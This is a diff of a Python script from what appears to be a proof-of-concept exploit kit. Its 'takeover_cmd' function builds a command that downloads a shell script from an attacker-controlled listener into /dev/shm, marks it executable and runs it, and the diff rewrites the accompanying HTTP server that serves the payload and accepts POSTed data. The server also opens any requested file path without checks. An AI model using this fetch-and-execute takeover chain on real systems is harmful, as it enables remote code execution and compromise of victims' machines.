@@ -1,43 +1,64 @@
 #!/usr/bin/env python3
-from http.server import HTTPServer, SimpleHTTPRequestHandler
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from io import BytesIO
 import os
-import threading
 import time
 
+srv_run = True
+
 def takeover_cmd(listen_ip: str, listen_port: int) -> str:
-    cmd_str = f"curl http://{listen_ip}:{listen_port}/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
-    # return f"ping {listen_ip}"
+    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
+    # cmd_str = f"ping {listen_ip}"
     return cmd_str
 
 
-from poc import logging
+def run_server(listen_ip: str = '0.0.0.0', listen_port: int = 1337):
 
-def http_server(listen_port):
-    listen_ip = '0.0.0.0'
-    srv_path = './srv'
-    server = HTTPServer((listen_ip, listen_port), SimpleHTTPRequestHandler)
-    thread = threading.Thread(target=server.serve_forever)
-    thread.daemon = True
+    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
-    cwd = os.getcwd()
+        def do_GET(self):
+            if self.path == '/':
+                self.send_response(200)
+                self.end_headers()
+                return
+            try:
+                file_path = os.getcwd() + self.path
+                file = open(self.path[1:], 'rb').read()
+                self.send_response(200)
+                self.send_header('Content-type', 'application/zip')
+                self.end_headers()
+                self.wfile.write(bytes(file))
+            except:
+                self.send_response(404)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'404 - not found')
 
-    def start():
-        os.chdir(srv_path)
-        thread.start()
-        logging(f"Starting server on port: {server.server_port}\n")
+        def do_POST(self):
+            content_length = int(self.headers['Content-Length'])
+            body = self.rfile.read(content_length)
+            self.send_response(200)
+            self.end_headers()
+            response = BytesIO()
+            response.write(b'POST request\n')
+            response.write(b'Received: ')
+            response.write(body)
+            self.wfile.write(response.getvalue())
 
-    def stop():
-        os.chdir(cwd)
-        server.shutdown()
-        server.socket.close()
-        logging(f"Stopping server on port: {server.server_port}\n")
-
-    return start, stop
-
-def takeover_prep(listen_ip: str, listen_port: int):
-    logging("Takeover prep\n")
+        def do_QUIT(self):
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'Good bye.\n')
+            global srv_run
+            srv_run = False
 
 
-def takeover_cleanup():
-    logging("Takeover cleanup")
+    httpd = HTTPServer(('0.0.0.0', listen_port), SimpleHTTPRequestHandler)
+
+    while (srv_run == True):
+        httpd.handle_request()
+
+
+if __name__ == "__main__":
+    run_server()
 
